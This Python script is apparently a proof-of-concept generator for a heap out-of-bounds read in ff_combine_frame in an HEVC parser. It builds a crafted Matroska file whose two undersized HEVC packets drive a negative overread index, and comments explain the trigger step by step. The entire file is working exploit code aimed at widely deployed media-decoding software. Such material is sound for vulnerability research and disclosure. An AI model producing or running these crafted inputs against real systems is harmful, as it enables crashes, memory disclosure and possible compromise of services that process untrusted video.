#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap OOB Read in ff_combine_frame
Crafts a minimal MKV with HEVC video to trigger negative overread index.
"""
import struct
import os

def encode_vint(value):
    """Encode EBML variable-length integer."""
    if value < 0x7F:
        return bytes([value | 0x80])
    elif value < 0x3FFF:
        return struct.pack('>H', value | 0x4000)
    elif value < 0x1FFFFF:
        b = struct.pack('>I', value | 0x200000)
        return b[1:]
    elif value < 0x0FFFFFFF:
        return struct.pack('>I', value | 0x10000000)
    else:
        raise ValueError(f"Value too large: {value}")

def ebml_element(elem_id, data):
    """Create an EBML element: ID + size + data."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return elem_id + encode_vint(len(data)) + data

def ebml_uint(elem_id, value, size=1):
    data = value.to_bytes(size, 'big')
    return ebml_element(elem_id, data)

def ebml_float(elem_id, value):
    data = struct.pack('>d', value)
    return ebml_element(elem_id, data)

# EBML IDs
EBML_ID = b'\x1A\x45\xDF\xA3'
SEGMENT_ID = b'\x18\x53\x80\x67'
INFO_ID = b'\x15\x49\xA9\x66'
TRACKS_ID = b'\x16\x54\xAE\x6B'
CLUSTER_ID = b'\x1F\x43\xB6\x75'
TRACK_ENTRY_ID = b'\xAE'
SIMPLE_BLOCK_ID = b'\xA3'
TIMESTAMP_ID = b'\xE7'  # Cluster TimestampScale
TIMECODE_SCALE_ID = b'\x2A\xD7\xB1'
TRACK_NUMBER_ID = b'\xD7'
TRACK_UID_ID = b'\x73\xC5'
TRACK_TYPE_ID = b'\x83'
CODEC_ID_ID = b'\x86'
VIDEO_ID = b'\xE0'
PIXEL_WIDTH_ID = b'\xB0'
PIXEL_HEIGHT_ID = b'\xBA'
CODEC_PRIVATE_ID = b'\x63\xA2'
MUXING_APP_ID = b'\x4D\x80'
WRITING_APP_ID = b'\x57\x41'
DOC_TYPE_ID = b'\x42\x82'
DOC_TYPE_VERSION_ID = b'\x42\x87'
DOC_TYPE_READ_VERSION_ID = b'\x42\x85'
EBML_VERSION_ID = b'\x42\x86'
EBML_READ_VERSION_ID = b'\x42\xF7'
EBML_MAX_ID_LENGTH_ID = b'\x42\xF2'
EBML_MAX_SIZE_LENGTH_ID = b'\x42\xF3'

# Minimal HEVC codec private (VPS+SPS+PPS in HEVCDecoderConfigurationRecord)
# Format: configurationVersion(1) + profile_space/tier/profile(1) + profile_compat(4)
#         + constraint_flags(6) + level(1) + ... arrays
# Use a minimal valid-ish HEVC config
hevc_codec_private = bytes([
    0x01,  # configurationVersion
    0x01,  # general_profile_space=0, general_tier_flag=0, general_profile_idc=1
    0x60, 0x00, 0x00, 0x00,  # general_profile_compatibility_flags
    0x90, 0x00, 0x00, 0x00, 0x00, 0x00,  # general_constraint_indicator_flags
    0x5D,  # general_level_idc = 93 (3.1)
    0xF0, 0x00,  # min_spatial_segmentation_idc
    0xFC,  # parallelismType
    0xFD,  # chroma_format_idc = 1 (4:2:0)
    0xF8,  # bit_depth_luma_minus8 = 0
    0xF8,  # bit_depth_chroma_minus8 = 0
    0x00, 0x00,  # avgFrameRate
    0x0F,  # constantFrameRate=0, numTemporalLayers=1, temporalIdNested=1, lengthSizeMinusOne=3
    0x00,  # numOfArrays = 0 (no parameter sets inline — we send them in-band)
])

# Craft HEVC NAL units
# First packet: tiny, just a partial start code — 3 bytes
# This makes pc->index = 3 after the first call (< 6)
# NAL: 00 00 01 (start code only, incomplete)
first_hevc_packet = bytes([0x00, 0x00, 0x01])

# Second packet: VPS NAL unit starting at byte 0
# This triggers hevc_find_frame_end to return next = 0 - 6 = -6
# VPS nal_unit_type = 32, encoded in header as (32 << 1) = 64 = 0x40
# HEVC NAL header: forbidden_zero(1) | nal_unit_type(6) | nuh_layer_id(6) | nuh_temporal_id_plus1(3)
# = 0 | 100000 | 000000 | 001 = 0100 0000 0000 0001 = 0x40 0x01
# With start code: 00 00 01 40 01 ...
second_hevc_packet = bytes([
    0x00, 0x00, 0x01,  # start code
    0x40, 0x01,        # VPS NAL header
    0x0C, 0x01, 0xFF, 0xFF,  # minimal VPS data
    0x01, 0x60, 0x00, 0x00, 0x03, 0x00, 0x90, 0x00,
    0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x5D, 0x95,
    0x98, 0x09,
])

def make_simple_block(track_num, timecode, keyframe, data):
    """Create a SimpleBlock element."""
    flags = 0x80 if keyframe else 0x00  # keyframe flag
    block_header = encode_vint(track_num) + struct.pack('>h', timecode) + bytes([flags])
    block_data = block_header + data
    return ebml_element(SIMPLE_BLOCK_ID, block_data)

# Build MKV
def build_mkv():
    # EBML header
    ebml_header_data = (
        ebml_uint(EBML_VERSION_ID, 1) +
        ebml_uint(EBML_READ_VERSION_ID, 1) +
        ebml_uint(EBML_MAX_ID_LENGTH_ID, 4) +
        ebml_uint(EBML_MAX_SIZE_LENGTH_ID, 8) +
        ebml_element(DOC_TYPE_ID, b'matroska') +
        ebml_uint(DOC_TYPE_VERSION_ID, 4) +
        ebml_uint(DOC_TYPE_READ_VERSION_ID, 2)
    )
    ebml_header = ebml_element(EBML_ID, ebml_header_data)

    # Info element
    info_data = (
        ebml_uint(TIMECODE_SCALE_ID, 1000000, 3) +
        ebml_element(MUXING_APP_ID, b'poc_gen') +
        ebml_element(WRITING_APP_ID, b'poc_gen')
    )
    info = ebml_element(INFO_ID, info_data)

    # Video track
    video_data = (
        ebml_uint(PIXEL_WIDTH_ID, 64, 2) +
        ebml_uint(PIXEL_HEIGHT_ID, 64, 2)
    )
    video_elem = ebml_element(VIDEO_ID, video_data)

    track_entry_data = (
        ebml_uint(TRACK_NUMBER_ID, 1) +
        ebml_uint(TRACK_UID_ID, 1, 4) +
        ebml_uint(TRACK_TYPE_ID, 1) +  # video
        ebml_element(CODEC_ID_ID, b'V_MPEGH/ISO/HEVC') +
        ebml_element(CODEC_PRIVATE_ID, hevc_codec_private) +
        video_elem
    )
    track_entry = ebml_element(TRACK_ENTRY_ID, track_entry_data)
    tracks = ebml_element(TRACKS_ID, track_entry)

    # Cluster with two simple blocks
    block1 = make_simple_block(1, 0, True, first_hevc_packet)
    block2 = make_simple_block(1, 33, False, second_hevc_packet)

    cluster_data = ebml_uint(TIMESTAMP_ID, 0, 1) + block1 + block2
    cluster = ebml_element(CLUSTER_ID, cluster_data)

    # Segment (use unknown size: 0x01 FF FF FF FF FF FF FF)
    segment_content = info + tracks + cluster
    segment = SEGMENT_ID + b'\x01\xFF\xFF\xFF\xFF\xFF\xFF\xFF' + segment_content

    return ebml_header + segment

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.mkv')
data = build_mkv()
with open(out_path, 'wb') as f:
    f.write(data)
print(f"Written {len(data)} bytes to {out_path}")
